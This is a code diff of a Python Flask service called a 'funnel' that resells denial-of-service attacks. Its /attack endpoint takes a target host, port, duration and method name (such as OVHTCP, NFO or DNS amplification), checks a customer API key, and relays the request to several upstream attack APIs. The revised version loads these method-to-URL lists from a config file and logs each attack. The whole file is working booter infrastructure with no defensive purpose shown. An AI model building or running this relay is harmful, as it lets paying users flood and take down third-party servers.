@@ -1,16 +1,25 @@
-# Python Funnel by Arx & Xplode hhh add yo keys and shi in settings.toml
-from flask import Flask,send_file
-from flask import request
-from flask import jsonify
-import random
-import requests
+# ahh py funoo by arx & xplode hh
+import yaml
 import toml
+import requests
+import ipaddress
+import time
+from urllib.parse import urlparse
+from flask import Flask, send_file, request, jsonify
 
+# Open the config file and read the contents
+with open('config.yml', 'r') as f:
+    config = yaml.safe_load(f)
 
-config = toml.load('settings.toml')
+# Read the settings.toml file
+config_toml = toml.load('settings.toml')
+blacklisted_domains = config_toml.get('config').get('blacklist')
+apikeys = config_toml.get('config').get('keys')
+maxtime = int(config_toml.get('config').get('maxtime'))
 
-apikeys = config.get('config').get('keys')
-maxtime = int(config.get('config').get('maxtime'))
+# Get the list of methods from the config file
+methods = config['methods']
+
 app = Flask(__name__)
 
 @app.route("/")
@@ -19,65 +28,88 @@ def index():
 
 @app.route("/attack")
 def attack():
-    key = request.args.get('key')
+    # Get the host argument from the request
     host = request.args.get('host')
+
+    # Check if the host argument is a valid IP address or URL
+    is_valid_ip = False
+    is_valid_url = False
+    try:
+        # Check if the host argument is a valid IP address
+        ip = ipaddress.ip_address(host)
+        is_valid_ip = True
+    except ValueError:
+        # Check if the host argument is a valid URL
+        url = urlparse(host)
+        if url.scheme and url.netloc:
+            is_valid_url = True
+
+    # If the host argument is not a valid IP address or URL, return an error
+    if not (is_valid_ip or is_valid_url):
+        return jsonify(
+            error="True",
+            message="Invalid host. Host must be a valid IP address or URL."
+        ), 451
+
+    for domain in blacklisted_domains:
+        if domain in host:
+            return jsonify(
+                error="True",
+                message="Host is blacklisted."
+            ), 451
+
+    key = request.args.get('key')
     port = int(request.args.get('port'))
-    time = int(request.args.get('time'))
+    duration = int(request.args.get('time'))
     method = request.args.get('method')
     if key not in apikeys:
         return jsonify(
             error="True",
             message="API Key Invalid."
-        ),451
+        ), 451
     elif port > 65535:
         return jsonify(
             error="True",
             message="Invalid Port."
-        ),451
-    elif time > maxtime:
+        ), 451
+    elif duration > maxtime:
         return jsonify(
             error="True",
             message="Max Time Exceeded."
-        ),451
+        ), 451
     else:
-        if method == 'OVHTCP':
-            requests.get(f"https://api1.net/attack?host={host}&time={time}&port={port}&method=OACK")
-            requests.get(f"https://api2.net/attack?host={host}&time={time}&port={port}&method=OVHTCPV2")
-            requests.get(f"https://api3.net/attack?host={host}&time={time}&port={port}&method=SOCKET")
+        with open('attacks.log', 'a') as f:
+            f.write(f"{host}:{port} - {duration}s - {method}\n")
+        # Check if the specified method is in the list of methods from the config file
+        if method in methods:
+            # Get the list of URLs for the specified method from the config file
+            urls = methods[method]
+
+            # Start the timer
+            start_time = time.perf_counter()
+
+            # Iterate over the list of URLs and send a request to each URL
+            for url in urls:
+                requests.get(f"{url}?host={host}&time={duration}&port={port}&method={method}")
+
+            # Stop the timer
+            end_time = time.perf_counter()
+
+            # Compute the elapsed time
+            elapsed_time = end_time - start_time
+
             return jsonify(
                 error="False",
                 host=host,
                 port=port,
-                time=time,
-                method=method
-            )
-        elif method == 'NFO':
-            requests.get(f"https://api1.net/attack?host={host}&time={time}&port={port}&method=NFOTCP")
-            requests.get(f"https://api2.net/attack?host={host}&time={time}&port={port}&method=WRA")
-            requests.get(f"https://api3.net/attack?host={host}&time={time}&port={port}&method=NFOMEXICANV45")
-            return jsonify(
-                error="False",
-                host=host,
-                port=port,
-                time=time,
-                method=method
-            )
-        elif method == 'DNS':
-            requests.get(f"https://api1.net/attack?host={host}&time={time}&port={port}&method=DNS")
-            requests.get(f"https://api2.net/attack?host={host}&time={time}&port={port}&method=AMPMIX")
-            requests.get(f"https://api3.net/attack?host={host}&time={time}&port={port}&method=DNS")
-            return jsonify(
-                error="False",
-                host=host,
-                port=port,
-                time=time,
-                method=method
+                time=duration,
+                method=method,
+                elapsed=elapsed_time
             )
         else:
-           return jsonify(
-               error="True",
-               message="Method Not Found."
-           ),451
+            return jsonify(
+                error="True",
+                message="Method Not Found."
+            ), 451
 
-
-app.run(host="0.0.0.0",port=1337) # choose wateva port u want
+app.run(host="0.0.0.0",port=7331)
